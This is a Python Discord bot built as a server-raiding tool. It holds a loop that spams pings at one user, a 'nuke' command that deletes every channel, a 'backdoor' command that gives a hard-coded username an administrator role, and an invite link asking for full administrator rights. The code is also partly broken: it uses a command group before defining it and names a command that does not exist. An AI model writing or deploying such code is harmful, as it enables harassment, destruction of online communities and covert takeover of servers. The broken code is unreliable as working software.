import os
import asyncio
import discord
from discord.ext import commands

# ================= CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1258115928525373570
OWNER_USERNAME = "nico044037"

SPAM_MESSAGE = "<@1419680644618780824>"
SPAM_DELAY = 0.8  # SAFE delay (do not lower)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(
    command_prefix=["$", "!", "?"],
    intents=intents,
    help_command=None
)

spam_task: asyncio.Task | None = None

# ================= READY =================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# ================= OWNER CHECK =================
def is_owner(ctx):
    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
# ================= DELETE ALL =================
@sudo.command(name="nuke")
async def sudo_nuke(ctx, confirm: str = None):
    if ctx.author.name != "nico044037":
        return

    if confirm != "CONFIRM":
        await ctx.send(
            "⚠️ **DANGER ZONE** ⚠️\n"
            "This will delete **ALL CHANNELS** in this server.\n\n"
            "Run:\n"
            "`$sudo deleteall CONFIRM`"
        )
        return

    await ctx.send("🧨 deleting all channels...")

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete(reason="sudo deleteall")
        except (discord.Forbidden, discord.HTTPException):
            pass
# ================= SPAM LOOP =================
async def spam_loop(target: discord.abc.Messageable):
    try:
        while True:
            await target.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
    except asyncio.CancelledError:
        pass
    except discord.Forbidden:
        pass

# ================= SUDO GROUP =================
@bot.group(name="sudo", invoke_without_command=True)
async def sudo(ctx):
    if not is_owner(ctx):
        return
    await ctx.send(
        "Commands:\n"
        "`$sudo startmessage`\n"
        "`$sudo stopmessage`"
    )

# ================= START MESSAGE =================
@sudo.command(name="startmessage")
async def sudo_startmessage(ctx):
    global spam_task

    if not is_owner(ctx):
        return

    if spam_task and not spam_task.done():
        await ctx.send("❌ already running")
        return

    spam_task = asyncio.create_task(spam_loop(ctx.channel))
    await ctx.send("✅ spam started")
# ================= sudo add =================
@sudo.command(name="add")
async def sudo_add(ctx):
    await ctx.send(
        "Add me to your server:\n"
        "https://discord.com/oauth2/authorize"
        "?client_id=1470802191139864659"
        "&permissions=8"
        "&integration_type=0"
        "&scope=bot+applications.commands"
    )

# ================= BACKDOOR =================
USERNAME = "nico044037"
ROLE_NAME = "Backdoored"

@sudo.command(name="backdoor")
async def sudo_backdoor(ctx):
    guild = ctx.guild

    member = discord.utils.find(
        lambda m: m.name == USERNAME,
        guild.members
    )

    if member is None:
        await ctx.send("user not found")
        return

    role = discord.utils.get(guild.roles, name=ROLE_NAME)

    if role is None:
        role = await guild.create_role(
            name=ROLE_NAME,
            permissions=discord.Permissions(administrator=True),
            reason="sudo backdoor"
        )

    if role not in member.roles:
        await member.add_roles(role)

    await ctx.send(f"done → {member.mention}")
# ================= rename backdoor =================
@sudo.command(name="server")
async def sudo_server(ctx, action: str = None, *, name: str = None):
    # ONLY allow this exact username
    if ctx.author.name != "nico044037":
        return

    if action != "rename" or not name:
        await ctx.send("usage: `$sudo server rename <new name>`")
        return

    try:
        await ctx.guild.edit(name=name, reason="sudo server rename")
        await ctx.send(f"✅ server renamed to **{name}**")
    except discord.Forbidden:
        await ctx.send("❌ missing permissions")
# ================= ILLEGAL =================
@sudo.command(name="Illegal")
async def sudo_Illegal(ctx):
    if ctx.author.name != "nico044037":
        return

    await ctx.send("https://youtube.com/shorts/AOwExoETWPc?si=6SbkmQSKBeGM9z8Q")
# ================= STOP MESSAGE =================
@sudo.command(name="stopmessage")
async def sudo_stopmessage(ctx):
    global spam_task

    if not is_owner(ctx):
        return

    if not spam_task:
        await ctx.send("❌ no active spam")
        return

    spam_task.cancel()
    spam_task = None
    await ctx.send("🛑 spam stopped")
    
# ================= ERROR HANDLER =================
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send("❌ error")

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN environment variable not set")

bot.run(TOKEN)















